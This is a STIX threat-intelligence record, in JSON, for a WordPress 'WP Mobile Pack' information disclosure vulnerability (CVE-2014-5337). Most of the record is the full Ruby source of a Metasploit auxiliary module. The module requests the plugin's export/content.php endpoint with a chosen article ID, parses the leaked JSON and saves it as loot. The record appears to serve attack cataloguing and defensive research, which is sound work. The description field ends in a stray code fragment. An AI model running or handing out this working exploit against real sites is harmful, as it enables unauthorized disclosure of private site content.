{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0153618c-89bf-4cae-a934-6cbc8ccc7508",
    "created": "2024-08-14T16:29:04.557501Z",
    "modified": "2024-08-14T16:29:04.557504Z",
    "name": "WordPress Mobile Pack Information Disclosure Vulnerability",
    "description": " This module exploits an information disclosure vulnerability in WordPress Plugin \"WP Mobile Pack\" version 2.1.2, allowing to read files with privileges information.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_mobile_pack_info_disclosure.rb",
            "external_id": "wp_mobile_pack_info_disclosure.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "8107"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WordPress Mobile Pack Information Disclosure Vulnerability',\n      'Description'    => %q{\n        This module exploits an information disclosure vulnerability in WordPress Plugin\n        \"WP Mobile Pack\" version 2.1.2, allowing to read files with privileges\n        information.\n      },\n      'References'     =>\n        [\n          ['CVE' , '2014-5337'],\n          ['WPVDB', '8107'],\n          ['PACKETSTORM', '132750']\n        ],\n      'Author'         =>\n        [\n          'Nitin Venkatesh', # Vulnerability Discovery\n          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module\n        ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        OptString.new('POSTID', [true, 'The post identification to read', '1'])\n      ])\n  end\n\n  def check\n    check_plugin_version_from_readme('wordpress-mobile-pack', '2.1.3')\n  end\n\n  def run_host(ip)\n    postid = datastore['POSTID']\n\n    begin\n      res = send_request_cgi(\n        'method'    => 'GET',\n        'uri'       => normalize_uri(wordpress_url_plugins, 'wordpress-mobile-pack', 'export', 'content.php'),\n        'vars_get'  => {\n          'content'   => 'exportarticle',\n          'callback'  => 'exportarticle',\n          'articleId' => \"#{postid}\"\n        }\n      )\n      temp = JSON.parse(res.body.gsub(/exportarticle\\(/, \"\").gsub(/\\)/, \"\"))\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, JSON::ParserError => e\n      print_error(\"The following Error was encountered: #{e.class}\")\n      return\n    end\n\n    if res &&\n        res.code == 200 &&\n        res.body.length > 29 &&\n        res.headers['Content-Type'].include?('application/json') &&\n        !res.body.include?('\"error\":')\n\n      vprint_status('Enumerating...')\n      res_clean = JSON.pretty_generate(temp)\n      vprint_good(\"Found:\\n\\n#{res_clean}\\n\")\n\n      path = store_loot(\n        'mobilepack.disclosure',\n        'text/plain',\n        ip,\n        res_clean\n      )\n      print_good(\"File saved in: #{path}\")\n    else\n      print_error(\"Nothing was downloaded. You can try checking the POSTID parameter.\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}